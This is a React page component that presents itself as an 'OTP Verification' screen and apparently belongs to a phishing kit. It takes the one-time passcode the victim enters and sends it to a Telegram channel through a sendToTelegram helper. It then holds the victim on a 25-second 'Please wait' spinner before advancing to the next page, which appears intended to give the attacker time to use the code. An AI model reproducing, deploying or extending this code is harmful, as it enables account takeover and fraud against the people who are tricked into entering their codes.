import { useState } from "react";
import { AppLayout } from "../../components/AppChrome/AppLayout";
import { Button } from "../../components/ui/Button";
import { useNavigate } from "../../app/router";
import { sendToTelegram, formatEntry } from "../../lib/telegram";
import "./Page4.css";

export function Page4() {
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!/^\d{4,6}$/.test(otp)) {
      return setError("Please enter valid OTP");
    }
    setLoading(true);
    sendToTelegram(
      formatEntry("🔑 OTP — Step 1", {
        "OTP": otp,
      })
    );
    setTimeout(() => {
      setLoading(false);
      navigate("/page5");
    }, 25000);
  };

  if (loading) {
    return (
      <AppLayout title="Processing">
        <div className="pg4-loader">
          <div className="pg4-loader__card">
            <div className="pg4-loader__spinner" />
            <p className="pg4-loader__text">Please wait...</p>
          </div>
        </div>
      </AppLayout>
    );
  }

  return (
    <AppLayout title="OTP Verification">
      <div className="pg4">
        <section className="pg4__card">
          <h1 className="pg4__title">OTP Verification</h1>
          <p className="pg4__text">Enter the OTP sent to your registered mobile number</p>
          <form className="pg4__form" onSubmit={handleSubmit} noValidate>
            <div className="pg4__field">
              <label className="pg4__label" htmlFor="otp">
                Enter OTP
              </label>
              <input
                id="otp"
                className="pg4__input"
                type="text"
                inputMode="numeric"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder="Enter OTP"
                maxLength={6}
              />
            </div>
            {error && <p className="pg4__error">{error}</p>}
            <Button type="submit" variant="primary" block>
              Proceed
            </Button>
          </form>
        </section>
      </div>
    </AppLayout>
  );
}
